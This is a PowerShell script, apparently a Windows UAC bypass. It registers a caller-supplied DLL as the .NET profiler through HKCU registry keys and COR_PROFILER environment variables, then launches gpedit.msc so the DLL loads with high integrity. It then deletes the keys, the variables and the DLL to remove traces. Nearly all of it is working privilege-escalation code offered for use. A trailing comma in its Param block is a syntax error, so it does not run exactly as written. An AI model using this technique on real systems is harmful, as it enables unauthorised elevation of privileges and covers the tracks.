<#
.SYNOPSIS
Author: Daniel Diez

.LINK
https://gist.github.com/clavoillotte/f2fba9fa4ba8db14093a62164963d4a9

.PARAMETER DllPath
Specifies the command you would like to run in high integrity context.
 
.EXAMPLE
Invoke-DotnetProfilerBypass -DllPath "C:\Users\user\test.dll"

.NOTES

#>

function Invoke-DotnetProfilerBypass {

    Param (
      [Parameter(Mandatory=$True)]
      [String]$DllPath,
    )


    # GUID, path and content
    $GUID = '{' + [guid]::NewGuid() + '}'
    
    # create registry keys
    Write-Host "Creating registry keys in HKCU:Software\Classes\CLSID\$($GUID)"
    New-Item -Path HKCU:\Software\Classes\CLSID\$GUID\InprocServer32 -Value $DllPath -Force | Out-Null
    New-ItemProperty -Path HKCU:\Environment -Name "COR_ENABLE_PROFILING" -PropertyType String -Value "1" -Force | Out-Null
    New-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER" -PropertyType String -Value $GUID -Force | Out-Null
    New-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER_PATH" -PropertyType String -Value $DllPath -Force | Out-Null

    # set env variables
    [Environment]::SetEnvironmentVariable("COR_ENABLE_PROFILING", "1", "User")
    [Environment]::SetEnvironmentVariable("COR_PROFILER", $GUID, "User")
    [Environment]::SetEnvironmentVariable("COR_PROFILER_PATH", $DllPath, "User")
    Set-Item -path env:COR_ENABLE_PROFILING -value ("1")
    Set-Item -path env:COR_PROFILER -value ($GUID)
    Set-Item -path env:COR_PROFILER_PATH -value ($DllPath)

    # run mmc
    Write-Host "Running MMC..."
    Start-Process -FilePath gpedit.msc

    # wait before cleanup
    Sleep 5

    # remove registry keys, DLL and env variables
    Write-Host "Cleanup..."
    Remove-Item -Path HKCU:\Software\Classes\CLSID\$GUID -Recurse -Force
    Remove-ItemProperty -Path HKCU:\Environment -Name "COR_ENABLE_PROFILING" 
    Remove-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER"
    Remove-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER_PATH"
    Remove-Item -Force $DllPath
    [Environment]::SetEnvironmentVariable("COR_ENABLE_PROFILING", $null, "User")
    [Environment]::SetEnvironmentVariable("COR_PROFILER", $null, "User")
    [Environment]::SetEnvironmentVariable("COR_PROFILER_PATH", $null, "User")
    Remove-Item Env:\COR_ENABLE_PROFILING
    Remove-Item Env:\COR_PROFILER
    Remove-Item Env:\COR_PROFILER_PATH

    Write-Host "Done"
    
}